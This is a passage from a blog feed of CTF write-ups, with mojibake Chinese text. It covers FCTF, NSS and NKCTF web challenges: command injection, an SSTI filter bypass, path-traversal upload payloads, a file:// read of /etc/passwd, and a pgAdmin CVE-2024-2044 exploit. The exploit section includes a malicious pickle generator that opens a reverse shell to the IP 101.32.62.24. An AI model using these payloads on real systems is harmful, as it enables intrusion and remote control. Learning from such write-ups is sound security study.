href="https://xz.aliyun.com/t/9584?time__1311=n4%2BxuDgD9ADtDQII40ywbDyiDRlDclAmxEGYD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-26">ä»¥ Bypass ä¸ºä¸­å¿ƒè°­è°ˆ Flask-jinja2 SSTI çš„åˆ©ç”¨</a><br>è¿™ç¯‡æ–‡ç« å‡ ä¹å°†æ‰€æœ‰çš„bypassæŠ€å·§å†™äº†ä¸‹æ¥</p>]]></content>
      
      
      <categories>
          
          <category> trick </category>
          
          <category> XY </category>
          
      </categories>
      
      
        <tags>
            
            <tag> çŸ¥è¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FCTFçš„wp</title>
      <link href="/2024/04/06/FCTF%E7%9A%84wp/"/>
      <url>/2024/04/06/FCTF%E7%9A%84wp/</url>
      
        <content type="html"><![CDATA[<h1 id="è¿™ä¸ªæ¸…æ˜é—²ç€æ²¡äº‹å’Œé˜Ÿå‹å·å·è·‘å»æ‰“ç¦å·å¤§å­¦çš„çº¿ä¸Šæ ¡èµ›ã€‚æ•´ä½“ä¸‹æ¥æ‰“çš„è¿˜æ˜¯å¾ˆå¼€å¿ƒçš„ã€‚ç¦å¤§çš„å¸ˆå‚…äººå¾ˆå¥½ï¼Œå‘ç°æˆ‘ä»¬æ˜¯æ ¡å¤–çš„ä¹Ÿå°±åªæ˜¯è®©æˆ‘ä»¬æ¢ä¸ªå·æ‰“ï¼Œä¸è¦äº¤flagï¼Œæ•´ä½“ä¸‹æ¥é¢˜ç›®å¯¹webæ‰‹æ¥è¯´è¿˜æ˜¯æ¯”è¾ƒå‹å¥½çš„ï¼Œå¯¹PWNæ‰‹å¯èƒ½å°±ä¸å¤ªå‹å¥½äº†ã€‚è¿˜æ˜¯èƒ½å­¦åˆ°ä¸å°‘çš„ä¸‹é¢æ˜¯wp"><a href="#è¿™ä¸ªæ¸…æ˜é—²ç€æ²¡äº‹å’Œé˜Ÿå‹å·å·è·‘å»æ‰“ç¦å·å¤§å­¦çš„çº¿ä¸Šæ ¡èµ›ã€‚æ•´ä½“ä¸‹æ¥æ‰“çš„è¿˜æ˜¯å¾ˆå¼€å¿ƒçš„ã€‚ç¦å¤§çš„å¸ˆå‚…äººå¾ˆå¥½ï¼Œå‘ç°æˆ‘ä»¬æ˜¯æ ¡å¤–çš„ä¹Ÿå°±åªæ˜¯è®©æˆ‘ä»¬æ¢ä¸ªå·æ‰“ï¼Œä¸è¦äº¤flagï¼Œæ•´ä½“ä¸‹æ¥é¢˜ç›®å¯¹webæ‰‹æ¥è¯´è¿˜æ˜¯æ¯”è¾ƒå‹å¥½çš„ï¼Œå¯¹PWNæ‰‹å¯èƒ½å°±ä¸å¤ªå‹å¥½äº†ã€‚è¿˜æ˜¯èƒ½å­¦åˆ°ä¸å°‘çš„ä¸‹é¢æ˜¯wp" class="headerlink" title="è¿™ä¸ªæ¸…æ˜é—²ç€æ²¡äº‹å’Œé˜Ÿå‹å·å·è·‘å»æ‰“ç¦å·å¤§å­¦çš„çº¿ä¸Šæ ¡èµ›ã€‚æ•´ä½“ä¸‹æ¥æ‰“çš„è¿˜æ˜¯å¾ˆå¼€å¿ƒçš„ã€‚ç¦å¤§çš„å¸ˆå‚…äººå¾ˆå¥½ï¼Œå‘ç°æˆ‘ä»¬æ˜¯æ ¡å¤–çš„ä¹Ÿå°±åªæ˜¯è®©æˆ‘ä»¬æ¢ä¸ªå·æ‰“ï¼Œä¸è¦äº¤flagï¼Œæ•´ä½“ä¸‹æ¥é¢˜ç›®å¯¹webæ‰‹æ¥è¯´è¿˜æ˜¯æ¯”è¾ƒå‹å¥½çš„ï¼Œå¯¹PWNæ‰‹å¯èƒ½å°±ä¸å¤ªå‹å¥½äº†ã€‚è¿˜æ˜¯èƒ½å­¦åˆ°ä¸å°‘çš„ä¸‹é¢æ˜¯wp"></a>è¿™ä¸ªæ¸…æ˜é—²ç€æ²¡äº‹å’Œé˜Ÿå‹å·å·è·‘å»æ‰“ç¦å·å¤§å­¦çš„çº¿ä¸Šæ ¡èµ›ã€‚æ•´ä½“ä¸‹æ¥æ‰“çš„è¿˜æ˜¯å¾ˆå¼€å¿ƒçš„ã€‚ç¦å¤§çš„å¸ˆå‚…äººå¾ˆå¥½ï¼Œå‘ç°æˆ‘ä»¬æ˜¯æ ¡å¤–çš„ä¹Ÿå°±åªæ˜¯è®©æˆ‘ä»¬æ¢ä¸ªå·æ‰“ï¼Œä¸è¦äº¤flagï¼Œæ•´ä½“ä¸‹æ¥é¢˜ç›®å¯¹webæ‰‹æ¥è¯´è¿˜æ˜¯æ¯”è¾ƒå‹å¥½çš„ï¼Œå¯¹PWNæ‰‹å¯èƒ½å°±ä¸å¤ªå‹å¥½äº†ã€‚è¿˜æ˜¯èƒ½å­¦åˆ°ä¸å°‘çš„ä¸‹é¢æ˜¯wp</h1><h2 id="pingä¸€ä¸‹"><a href="#pingä¸€ä¸‹" class="headerlink" title="pingä¸€ä¸‹~"></a>pingä¸€ä¸‹~</h2><p>ç­¾åˆ°é¢˜æ²¡ä»€ä¹ˆå¥½è¯´çš„ç›´æ¥ç®¡é“ç¬¦åŠ å‘½ä»¤æ‰§è¡Œå°±å¯ä»¥äº†ã€‚</p><h2 id="è¢«ä½ ä»¬ç©åäº†çš„ping"><a href="#è¢«ä½ ä»¬ç©åäº†çš„ping" class="headerlink" title="è¢«ä½ ä»¬ç©åäº†çš„ping"></a>è¢«ä½ ä»¬ç©åäº†çš„ping</h2><p>å’Œä¸Šä¸€é¢˜ç›¸æ¯”åªæ˜¯æ²¡æœ‰å›æ˜¾è€Œå·²ï¼Œä¸€å¼€å§‹æˆ‘å‡†å¤‡å¼¹shellåé¢å‘ç°å¼¹ä¸äº†å°±ç›´æ¥DNSå¤–å¸¦äº†ã€‚</p><h2 id="åƒæ‰å°åœŸè±†"><a href="#åƒæ‰å°åœŸè±†" class="headerlink" title="åƒæ‰å°åœŸè±†"></a>åƒæ‰å°åœŸè±†</h2><p>ç¦å¤§çš„é¢˜ç›®éƒ½æ˜¯æœ‰ç»™æºç çš„ï¼Œå¦‚æœé¢˜ç›®æ²¡æœ‰ç»™å“ªä¸ªä»£å®¡çš„å·¥å…·ç½‘ç«™é‚£ä¹ˆéš¾åº¦æ˜¯æœ‰çš„ï¼Œä½†æ˜¯ç»™äº†ï¼Œç”¨å·¥å…·å¯ä»¥ä¸€çœ¼çœ‹å‡ºæ˜¯sqlæ³¨å…¥ï¼Œæ³¨å…¥ç‚¹æ˜¯<code>$_session[name]</code><br><br><br>è€Œsessionæ˜¯åœ¨rank.phpä¸‹ç›´æ¥GETä¼ å€¼çš„ã€‚åœ¨ç®€å•çš„æ‰‹æµ‹åå‘ç°ä½æŠ¥é”™æ³¨å…¥</p><h2 id="can-u-find-me"><a href="#can-u-find-me" class="headerlink" title="can_u_find_me?"></a>can_u_find_me?</h2><p>æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹æºç ä¼šå‘ç°404çª—å£çš„æŠ¥é”™é¡µé¢ä½æ¨¡æ¿æ³¨å…¥ã€‚<br><br><br>æˆ‘ä»¬çœ‹ä¸€ä¸‹waf<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> s.split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">return</span> s + <span class="string">&#x27;?hacker&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(s)</span><br></pre></td></tr></table></figure><br>è¿™ä¸ªwafæ£€æµ‹çš„æœ€åä¸€ä¸ª/é‚£ä¹ˆæˆ‘ä»¬åªè¦åœ¨urlååŠ ä¸Š<code>url/&#123;&#123;7*7&#125;&#125;/</code><br>è¿™æ ·å°±å¯ä»¥ç»•è¿‡è¿™ä¸ªwafäº†å‰©ä¸‹çš„å°±æ˜¯æ™®é€šçš„sstiäº†</p><h2 id="Potato-Netdisk"><a href="#Potato-Netdisk" class="headerlink" title="Potato_Netdisk"></a>Potato_Netdisk</h2><p>ç½‘ç›˜è¿™ä¸¤é¢˜ç»™æˆ‘ç¬‘å•¦äº†ã€‚å…¨éƒ½å¯ä»¥éé¢„æœŸã€‚æœ€ä¸»è¦çš„æ˜¯éé¢„æœŸçš„åŸå› æ˜¯å°‘äº†ä¸ªæ‹¬å·ã€‚éš¾ç»·ã€‚ä½†æ˜¯åæ¥åœ¨æˆ‘çš„åé¦ˆä¸‹æŠŠè¿™ä¸ªéé¢„æœŸç»™ä¿®äº†ã€‚è¿™é‡Œè´´ä¸€ä¸‹å‡ºé¢˜äººçœ‹åˆ°è¿™ä¸ªéé¢„æœŸåçš„ååº”ã€‚<br><br><br>ä¿æŠ¤å‡ºé¢˜äººéšç§æ‰‹åŠ¨æ‰“ä¸ªç ï¼Œå˜¿å˜¿ã€‚<br>å¥½äº†è¦æ­£ç»å†™wpäº†<br>é¦–å…ˆçœ‹æºç ä¼šå‘ç°å…¶å°†æˆ‘ä»¬çš„ç…§ç‰‡ä¸Šä¼ åˆ°äº†é¢„è®¾å®šçš„è·¯å¾„ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„æ€è·¯å°±æ˜¯å°†æ–‡ä»¶ä¸Šä¼ åˆ°webç›®å½•ä¸‹ã€‚æˆ‘ä»¬å…ˆä¸Šä¼ ä¸€ä¸ªåä½../çš„æ¥çœ‹çœ‹wafçš„ååº”ã€‚å…¶å›æ˜¾å¦‚ä¸‹<br><br>å¯ä»¥å‘ç°å…¶ç‰©ç†è·¯å¾„å‘ç”Ÿäº†æ³„éœ²ï¼Œé‚£ä¹ˆè¿™æ—¶æˆ‘ä»¬èƒ½æƒ³åˆ°å¦‚æœå¯ä»¥è¿›è¡Œæ‹¼æ¥æ„é€ å‡º/tmp/upload/../../var/www/html/1.phpä¸å°±å¯ä»¥æŠŠ1.phpä¼ åˆ°htmlç›®å½•ä¸‹äº†å—?<br>ä½†æ˜¯æˆ‘ä»¬çœ‹æºç ä¼šå‘ç°å…¶éƒ½è®¾äº†wafæˆ‘ä»¬æ— æ³•ç›´æ¥ä¸Šä¼ è¿™ä¸ªæ–‡ä»¶åè¿›è¡Œæ‹¼æ¥<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validateFilePath</span>(<span class="params"><span class="variable">$path</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">str_contains</span>(<span class="variable">$path</span>,<span class="string">&#x27;..&#x27;</span>.DIRECTORY_SEPARATOR) || <span class="title function_ invoke__">str_contains</span>(<span class="variable">$path</span>,<span class="string">&#x27;/var/www/html&#x27;</span>)))&#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="number">403</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;éæ³•ä¸Šä¼ è·¯å¾„ï¼&quot;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬ç»§ç»­è¿›è¡Œä»£ç å®¡è®¡æŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶å¤¹ä¸Šä¼ çš„ä»£ç <br>åœ¨æ–‡ä»¶å¤¹ä¸Šä¼ çš„æºç é‡Œå¯ä»¥å‘ç°å¦‚ä¸‹ä»£ç <br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">normalizeFilePath</span>(<span class="params"><span class="variable">$path</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>], <span class="string">&#x27;Windows&#x27;</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$path</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å¯ä»¥å‘ç°å…¶å°†<code>\</code>è½¬æ¢æˆäº†/é‚£ä¹ˆæˆ‘ä»¬å°±æœ‰ç‚¹æƒ³æ³•äº†ï¼Œå¯ä»¥å°†æ‰€æœ‰çš„/å˜ä¸º<code>\</code>æ¥å°è¯•ä¸Šä¼ ã€‚å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..\\..\\var\\www\\html\\lalalala.php</span><br></pre></td></tr></table></figure><br>ä¼šå‘ç°ä¸Šä¼ æˆåŠŸã€‚æ¥ä¸‹æ¥å°±æ˜¯èšå‰‘è¿é©¬äº†ã€‚</p><h2 id="Potato-Netdisk-v2-0"><a href="#Potato-Netdisk-v2-0" class="headerlink" title="Potato_Netdisk_v2.0"></a>Potato_Netdisk_v2.0</h2><p>è¿™é¢˜å’Œä¸Šä¸€é¢˜åŒºåˆ«ä¸å¤§ï¼Œå”¯ä¸€çš„åŒºåˆ«å°±æ˜¯ä¼šåˆ é©¬å’Œwafæ›´å¼ºä¸€ç‚¹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validateFilePath</span>(<span class="params"><span class="variable">$path</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">str_contains</span>(<span class="variable">$path</span>,<span class="string">&#x27;..&#x27;</span>.DIRECTORY_SEPARATOR) || <span class="title function_ invoke__">str_contains</span>(<span class="variable">$path</span>,<span class="string">&#x27;/var.www.html&#x27;</span>)))&#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="number">403</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;éæ³•ä¸Šä¼ è·¯å¾„ï¼&quot;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>åœ¨ç®€å•æ‰‹æµ‹åå‘ç°æ— æ³•ä½¿ç”¨ä¸Šä¸€é¢˜çš„paylaodè¿›è¡Œä¸Šä¼ ã€‚<br>å¯æ˜¯è¿™ä¸ªé—®é¢˜ä¹Ÿä¸å¤§ã€‚æˆ‘ä»¬è¿›è¡Œç®€å•çš„ä¿®æ”¹è¿›è¡Œå°è¯•<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..\\..\\var\\www\\..\\www\\html\\lalalala.php</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬åœ¨å…¶ä¸­æ·»åŠ ä¸€ä¸ª..\\æ¥å¯¹å…¶è¿›è¡Œä¸­æ–­å°±å¯ä»¥æˆåŠŸä¸Šä¼ æ‹‰ã€‚</p><h2 id="ROIIS-blog"><a href="#ROIIS-blog" class="headerlink" title="ROIIS_blog"></a>ROIIS_blog</h2><p>å“ˆå“ˆåˆæ˜¯ä¸€ä¸ªcveã€‚è¿™é¢˜çš„cveè¿˜åå¹¶æ²¡æœ‰å¯¹æºç è¿›è¡Œä¿®æ”¹ï¼Œæˆ‘ä»¬åªè¦æŒ‰ç…§ç½‘ä¸Šçš„æ­¥éª¤æ¥æ‰“å³å¯ã€‚<br>æ‰“å¼€ç½‘ç«™<br>ç‚¹å‡»åŠŸèƒ½çš„æ–‡ç« å‘ç°å…¶ç›´æ¥æ³„éœ²äº†æ¡†æ¶çš„ç‰ˆæœ¬<br><br>æ¡†æ¶åä¸ºWordPressã€‚ç‰ˆæœ¬ä¸º4.6å¾ˆè€çš„ç‰ˆæœ¬äº†è¿cveéƒ½æ˜¯16å¹´çš„ã€‚è¿™é‡Œæˆ‘å°±ä¸å†å†™ä¸€éäº†ã€‚å‡ºäº†é…ç½®vpsä¼šéº»çƒ¦ä¸€ç‚¹å…¶ä»–éƒ½å¾ˆç®€å•ã€‚</p><h2 id="ezzzzzzzzz-PTA"><a href="#ezzzzzzzzz-PTA" class="headerlink" title="ezzzzzzzzz_PTA"></a>ezzzzzzzzz_PTA</h2><p>æ„Ÿè§‰å‡ºé¢˜äººæœ‰ç‚¹æ‡’äº†ä¹Ÿå¯èƒ½æ˜¯å‡ºé¢˜äººåªæœ‰ä¸€ä¸ªçš„åŸå› æ²¡åŠæ³•æ“å‡ºå¤ªå¤šé¢˜ã€‚å¯¼è‡´å¾ˆå¤šé¢˜éƒ½æ˜¯ä¸€ä¸ªç®€å•ç‰ˆä¸€ä¸ªåŠ å¼ºç‰ˆã€‚<br>è¿™é¢˜å°±æ˜¯ä¸€ä¸ªç®€å•çš„æ²™ç®±ç»•è¿‡ï¼Œå…¶ç¦äº†import oså’Œ<strong>import</strong>è€Œä¸”æˆ‘å†ä½¿ç”¨ç½‘ä¸Šçš„ä¸€äº›ç»•è¿‡payloadçš„æ—¶å€™ä¼šæŠ¥é”™ï¼Œæ„Ÿè§‰æ˜¯ç¯å¢ƒçš„åŸå› ã€‚æˆ‘å†™è¿™é¢˜ç”¨çš„æ˜¯å…¶è‡ªå¸¦çš„shellç±»æ¥è¿›è¡Œå†™ï¼Œæ­¥éª¤å’Œæˆ‘ä»¥å‰å­¦çš„sstiå¾ˆç›¸ä¼¼<br><br>payloadå¦‚ä¸Šå°±ä¸å±•å¼€ç»†è¯´äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
          <category> æ¯”èµ›wp(å¤ç°) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSåˆ·é¢˜2ã€‚</title>
      <link href="/2024/03/31/NSS%E5%88%B7%E9%A2%982/"/>
      <url>/2024/03/31/NSS%E5%88%B7%E9%A2%982/</url>
      
        <content type="html"><![CDATA[<h1 id="å“ˆå“ˆå“ˆå“ˆæ°´æ°´åšå®¢å†™ä¸€å†™åˆ·é¢˜å­¦åˆ°çš„ä¸€äº›çŸ¥è¯†ç‚¹"><a href="#å“ˆå“ˆå“ˆå“ˆæ°´æ°´åšå®¢å†™ä¸€å†™åˆ·é¢˜å­¦åˆ°çš„ä¸€äº›çŸ¥è¯†ç‚¹" class="headerlink" title="å“ˆå“ˆå“ˆå“ˆæ°´æ°´åšå®¢å†™ä¸€å†™åˆ·é¢˜å­¦åˆ°çš„ä¸€äº›çŸ¥è¯†ç‚¹"></a>å“ˆå“ˆå“ˆå“ˆæ°´æ°´åšå®¢å†™ä¸€å†™åˆ·é¢˜å­¦åˆ°çš„ä¸€äº›çŸ¥è¯†ç‚¹</h1><h1 id="HDCTF-2023-YamiYami"><a href="#HDCTF-2023-YamiYami" class="headerlink" title="[HDCTF 2023]YamiYami"></a>[HDCTF 2023]YamiYami</h1><p>è¿™é“é¢˜ç›®çš„å‰æçŸ¥è¯†ç‚¹æœ‰ç‚¹ä¸€ç‚¹å°å¤šï¼Œä¹Ÿå­¦åˆ°äº†ä¸å°‘çŸ¥è¯†</p><h2 id="urlopenå‡½æ•°"><a href="#urlopenå‡½æ•°" class="headerlink" title="urlopenå‡½æ•°"></a>urlopenå‡½æ•°</h2><p>è¯¥å‡½æ•°çš„ä½œç”¨æ˜¯æ‰“å¼€ä¸€ä¸ªurlå¹¶è¿›è¡Œé‡å®šå‘å¦‚ä¸‹ã€‚<br><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç½‘é¡µå¹¶æ²¡æœ‰è·³è½¬ä½†æ˜¯æˆåŠŸæŸ¥çœ‹åˆ°äº†ç™¾åº¦çš„ç½‘é¡µã€‚<br>è€Œè¿™ä¸ªå‡½æ•°ç»“åˆfileä¼ªåè®®æ˜¯å¯ä»¥å¯¹ç³»ç»Ÿçš„æ–‡ä»¶è¿›è¡Œè¯»å–ã€‚å¦‚ä¸‹<br><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶æˆåŠŸè®¿é—®å¹¶ä¸”urlopenæ˜¯å¯ä»¥è§£æurlçš„åœ°å€çš„å³<code>file://</code>åçš„åœ°å€å¯ä»¥è½¬ä¸ºurlç¼–ç çš„å½¢å¼ã€‚ç¬¬ä¸€ä¸ª<code>/</code>è¡¨ç¤ºæ ¹ç›®å½•ä¸èƒ½urlç¼–ç å…¶ä»–éƒ½å¯ä»¥ã€‚<br>å³æˆ‘ä»¬å¯ä»¥å°†æˆ‘ä»¬è¾“å…¥çš„æ–‡ä»¶åœ°å€è½¬ä¸ºurlç¼–ç å¦‚<br><code>/etc/passwd</code>å¯ä»¥è½¬ä¸º<code>/%65%74%63%2f%70%61%73%73%77%64</code>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é‡‡å–è¿™ç§æ–¹æ³•å¯¹wafè¿›è¡Œç»•è¿‡ã€‚</p><h2 id="PyYamlååºåˆ—åŒ–"><a href="#PyYamlååºåˆ—åŒ–" class="headerlink" title="PyYamlååºåˆ—åŒ–"></a>PyYamlååºåˆ—åŒ–</h2>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
          <category> åˆ·é¢˜ </category>
          
          <category> NSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åˆ·é¢˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NKCTFçš„å¤ç°å­¦ä¹ </title>
      <link href="/2024/03/25/NKCTF%E7%9A%84%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/03/25/NKCTF%E7%9A%84%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="è¿™æ¬¡NKCTFæˆ‘å¯ä»¥ç®—æ˜¯æ‰“çš„éå¸¸å·®äº†ã€‚ä¸‹é¢æ˜¯æˆ‘çš„ä¸€ä¸‹åæ€å’Œå¤ç°å­¦ä¹ "><a href="#è¿™æ¬¡NKCTFæˆ‘å¯ä»¥ç®—æ˜¯æ‰“çš„éå¸¸å·®äº†ã€‚ä¸‹é¢æ˜¯æˆ‘çš„ä¸€ä¸‹åæ€å’Œå¤ç°å­¦ä¹ " class="headerlink" title="è¿™æ¬¡NKCTFæˆ‘å¯ä»¥ç®—æ˜¯æ‰“çš„éå¸¸å·®äº†ã€‚ä¸‹é¢æ˜¯æˆ‘çš„ä¸€ä¸‹åæ€å’Œå¤ç°å­¦ä¹ "></a>è¿™æ¬¡NKCTFæˆ‘å¯ä»¥ç®—æ˜¯æ‰“çš„éå¸¸å·®äº†ã€‚ä¸‹é¢æ˜¯æˆ‘çš„ä¸€ä¸‹åæ€å’Œå¤ç°å­¦ä¹ </h1><h1 id="æˆ‘çš„ç¬¬ä¸€ä¸ªCMS"><a href="#æˆ‘çš„ç¬¬ä¸€ä¸ªCMS" class="headerlink" title="æˆ‘çš„ç¬¬ä¸€ä¸ªCMS"></a>æˆ‘çš„ç¬¬ä¸€ä¸ªCMS</h1><p>è¿™é¢˜æ²¡ä»€ä¹ˆå¥½è¯´çš„äº†ã€‚CVEä»€ä¹ˆéƒ½æ‰¾åˆ°äº†ï¼Œæ‰«äº†ä¸¤ä¸ªå­—å…¸å¼±å¯†ç æ²¡æ‰«å‡ºæ¥ã€‚æ‚²å•Šã€‚å¯†ç æœ¬å·²ç»æ¢äº†æ°”æ­»äº†ã€‚å­—å…¸é‡Œåªæœ‰admin123æ²¡æœ‰Admin123ã€‚æˆ‘çœ‹äº†ä¸€ä¸‹ç½‘ä¸Šçš„å­—å…¸å¾ˆå¤šéƒ½æ²¡æœ‰Admin123ã€‚<br><a href="https://github.com/capture0x/CMSMadeSimple/">CVE-2024-27622</a><br>ç›´æ¥adminç™»é™†ï¼Œä¹‹åæŒ‰ç…§cveè¿›è¡Œä»£ç æ‰§è¡Œå°±å¯ä»¥äº†</p><h1 id="attack-tacooooo"><a href="#attack-tacooooo" class="headerlink" title="attack_tacooooo"></a>attack_tacooooo</h1><p>è¿™é¢˜æˆ‘ä»¬æ‰“å¼€ä¼šå‘ç°ä¸ºpgadmin4çš„8.3ç‰ˆæœ¬æˆ‘ä»¬åœ¨ç½‘ä¸Šå¯ä»¥æŸ¥åˆ°å…¶å­˜åœ¨ä¸Šä¼ æ–‡ä»¶è¿›è¡Œååºåˆ—åŒ–æ‰§è¡Œçš„æ¼æ´ã€‚<a href="https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/">CVE-2024-2044 æ¼æ´</a><br>æˆ‘ä»¬è¦å…ˆç™»é™†åå°ã€‚è´¦å·æç¤ºä¸ºtacooooo@qq.comå¯†ç æˆ‘åœ¨æ‰“æ¯”èµ›çš„æ—¶å€™çŒœäº†å‡ºæ¥ä¸ºtacoooooã€‚<br>ä¹‹åæˆ‘ä»¬åœ¨è¿›è¡Œæ–‡ä»¶ä¸Šä¼ <br><img src="/2024/03/25/NKCTF%E7%9A%84%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/1.png" class="" title="alt text"><br>ä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™æˆ‘ä»¬å¯ä»¥è¿›è¡ŒæŠ“åŒ…<br>å‘åŒ…åæŸ¥çœ‹å“åº”æ¥æŸ¥çœ‹æ–‡ä»¶ä¸Šä¼ çš„ç›®å½•ä½ç½®<br>å› ä¸ºè§¦å‘è¿™ä¸ªååºåˆ—åŒ–éœ€è¦å°†sessionçš„çš„ä¸€éƒ¨åˆ†æ”¹æˆæ–‡ä»¶è·¯å¾„å¦‚ä¸‹<br>/var/lib/pgadmin/storage/tacooooo_qq.com/posix.pickle<br>ä¹‹åå†è§¦å‘ååºåˆ—åŒ–<br><img src="/2024/03/25/NKCTF%E7%9A%84%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/2.png" class="" title="alt text"><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line">import pickletools</span><br><span class="line"></span><br><span class="line">class exp():</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (exec, (&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;101.32.62.24&#x27;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&quot;,))</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    c = exp()</span><br><span class="line">    payload = pickle.dumps(c)</span><br><span class="line">    with open(&#x27;posix.pickle&#x27;, &#x27;wb&#x27;) as f:</span><br><span class="line">        f.write(payload)</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>è¿™ä¸€é¢˜æˆ‘åœ¨å¤ç°çš„æ—¶å€™ä¸€ç›´ä¸çŸ¥é“è¿™ä¹ˆå›äº‹å®˜æ–¹çš„expä¸€ç›´å¼¹ä¸å‡ºshellã€‚è¿˜æ˜¯åˆ©ç”¨äº†è¿™ä¸ªé˜Ÿä¼çš„expè¿›è¡Œå°è¯•ã€‚<a href="https://ycznkvrmzo.feishu.cn/docx/E92JdQmGxoUwXexnQgpcRaIsn7g">https://ycznkvrmzo.feishu.cn/docx/E92JdQmGxoUwXexnQgpcRaIsn7g</a><br>å¾ˆå¥‡æ€ªï¼Œè¿™ä¸ªå¸ˆå‚…çš„expå°±èƒ½å¼¹shellã€‚æ–‡ç« çš„å°±å¼¹ä¸å‡ºå»ã€‚<br>æ–‡ç« åœ¨æ‰“æ¯”èµ›çš„æ—¶å€™è¿™ä¸ªæ–‡ç« æœ‰æ‰¾åˆ°ï¼Œä¹Ÿè¿›è¡Œäº†å°è¯•å¤±è´¥åå°±æ”¾å¼ƒäº†ã€‚æŠŠæ—¶é—´éƒ½æµªè´¹åœ¨äº†js rceä¸Šå¯¼è‡´æˆ‘æ²¡æœ‰è®¤çœŸçœ‹è¿™é“é¢˜ç›®ã€‚åªèƒ½è¯´èƒ½åŠ›ä¸å¤Ÿã€‚æ–‡ç« 